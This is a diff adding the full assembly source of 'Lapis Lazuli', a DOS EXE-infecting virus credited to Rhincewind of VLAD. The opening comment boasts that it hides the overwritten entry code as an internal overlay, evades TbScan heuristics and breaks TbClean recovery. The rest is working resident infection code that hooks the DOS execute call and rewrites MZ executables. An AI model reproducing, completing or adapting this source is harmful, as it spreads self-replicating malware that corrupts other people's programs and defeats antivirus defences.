@@ -1,0 +1,255 @@
+; Lapis Lazuli, EXE infector extraordinaire by Rhincewind [Vlad]
+;
+; Lapis Lazuli can infect certain EXE files without modifying the header. 
+; This is accomplished by overwriting the entrypoint with viruscode, 
+; and saving what was there to the end of the EXE file without updating 
+; the imagelength in the header, rendering the original code an internal 
+; overlay. The loader places the virus in the IVT, opens argv[0] and 
+; restores the code.
+;
+; The original program is not hindered by this virus, save for a few bytes
+; less stackspace and one open file to be closed by DOS termination
+; proceedings.
+;
+; TbScan heuristics are evaded except the 'i' flag it indicates a file with
+; internal overlays with. TbClean's recovery bombs out, in both regular
+; and tracing mode. And as an added bonus, when infection is rejected
+; using TbFile, the program is destroyed. Way to go.
+;
+; F-Prot heuristically detects a virus in the dropper, but not in victims.
+
+                .model tiny
+                .code
+                .286
+                org 100h
+virlen          equ (endvirus-start)
+virlenpara      equ (endvirus-start+15)/16
+start:
+                push es
+                push cs
+                xor dx,dx
+                mov es,dx
+                call $+3
+get_delta:      mov di, 200h
+                cld
+                pop si
+                sub si, offset get_delta-100h
+                mov cx, (endvirus-start)
+                pop ds
+                mov word ptr ds:[si+_ss-100h],ss
+                rep movsb
+                mov si, 84h
+                mov ax,cx
+                mov ds,dx
+                cmp word ptr ds:[si+2],ax
+                jz dont_hook
+                movsw
+                movsw
+                xchg si,di
+                std
+                scasw
+                stosw
+                mov ax, offset int21+100h
+                stosw
+dont_hook:      pop ds
+                push ds
+                mov es, word ptr ds:[2ch]
+                mov ax,cx
+                mov di,ax
+                cld
+find_zero_zero: scasw
+                jz found
+                dec di
+                jmp find_zero_zero
+                db '[Lapis-Lazuli], Rhince/VLAD'
+found:          scasw
+                push es
+                pop ds
+                mov dx,di
+                mov ax, 3d00h
+                int 21h
+                jnc argv_0_open
+                mov ax, 4cffh
+                int 21h
+argv_0_open:    xchg ax,bx
+                mov ax, 4202h
+                dec cx
+                mov dx, -virlen
+                int 21h
+                pop es
+                push cs
+                pop ds
+                push cs
+                call delta_2
+delta_2:        pop si
+                sub si, offset delta_2-100h
+                push si
+                mov dx,si
+                mov ax, 0ea90h
+                push ax
+                mov ax, 1f06h
+                push ax
+                mov ax, 21cdh
+                push ax
+                mov ah, 3fh
+                mov cx, virlen
+                mov word ptr ds:[si+_sp-100h],sp
+                jmp $+2
+                db 0eah
+_sp             dw 0
+_ss             dw 0
+int21:          push ax
+                sub ax, 4b00h
+                jz execute
+                jmp end_handler
+execute:        push bx
+                push cx
+                push dx
+                push si
+                push di
+                push bp
+                push ds
+                push es
+                mov ax, 3d02h
+                int 21h
+                jnc file_okay
+                jmp bail
+file_okay:      mov bx, 5700h
+                xchg ax,bx
+                int 21h
+                push cx
+                push dx
+                push cs
+                pop ds
+                mov ah, 3fh
+                mov cx, 0ah
+                mov dx, offset buf+100h
+                int 21h
+                xor cx,ax
+                jnz go_close_file
+                mov si,cx
+                mov di,dx
+                add word ptr [di], -'ZM' ;aren't I clever.
+                jnz go_close_file
+                mov ax, 4200h
+                cwd
+                int 21h
+                push bx
+                mov ah, 48h
+                mov bx, word ptr [di+8]
+                cmp bx, virlenpara
+                jae larger
+                mov bx, virlenpara
+larger:         int 21h
+                pop bx
+                jnc dont_close_file
+go_close_file:  jmp close_file
+dont_close_file:push ax
+                mov cx, word ptr ds:[di+8]
+                shl cx,4
+                pop ds
+                mov ah, 3fh
+                int 21h
+                xor cx,ax
+                jnz go_close_file
+                push bx
+                add cx, word ptr ds:[si+6]
+                mov di, 16
+                mov ax, word ptr ds:[si+16h]
+                xor dx,dx
+                imul di
+                add ax, word ptr ds:[si+14h]
+                adc dx,si
+                mov bx,ax
+                mov bp,dx
+                or cx,cx
+                jz no_reloc
+                mov si, word ptr ds:[si+18h]
+check_item:     push bp        
+                mov ax, word ptr ds:[si+2]
+                xor dx,dx
+                mul di
+                add ax, word ptr ds:[si]
+                adc dx, 0
+                sub bp,dx
+                jnz next_item
+                sub ax,bx
+                js next_item
+                cmp ax, virlen
+                ja next_item
+                pop bp
+                pop bx
+                jmp abort
+next_item:      lodsw
+                lodsw
+                pop bp
+                loop check_item
+no_reloc:       mov si,cx
+                mov dx,bx
+                add cx,bp
+                mov ax, word ptr ds:[si+8]
+                shl ax,4
+                add dx,ax
+                adc cx,si
+                pop bx
+                push cx
+                push dx
+                mov ax, 4200h
+                int 21h
+                mov ah, 3fh
+                call dx_zero
+                cmp word ptr ds:[si],0e06h
+                jz bail_amidst_operations
+                xor cx,ax
+                jz read_okay
+bail_amidst_operations:                
+                pop ax
+                pop ax
+                jmp close_file
+dx_zero:        cwd
+cx_virlen:      mov cx, virlen
+_int21:         int 21h
+                ret
+read_okay:      mov ax, 4202h
+                int 21h
+len_okay:       mov ah, 40h
+                call dx_zero
+                mov ax, 4200h
+                pop dx
+                pop cx
+                int 21h
+                push ds
+                push cs
+                pop ds
+                mov ah, 40h
+                mov dx, 200h
+                call cx_virlen
+                pop ds
+abort:          push ds   
+                pop es
+                mov ah, 49h
+                int 21h
+close_file:     pop ax
+                mov dx, 5701h
+                pop cx
+                xchg ax,dx
+                int 21h
+                mov ah, 3eh         
+                int 21h
+bail:           pop es   
+                pop ds
+                pop bp
+                pop di
+                pop si
+                pop dx
+                pop cx
+                pop bx
+end_handler:    pop ax
+                db 0eah
+endvirus:       
+int21offset     equ $
+int21seg        equ $+2
+buf             equ $+4
+                dw 20cdh
+                db (endvirus-start-2) dup (90h)
+                end start
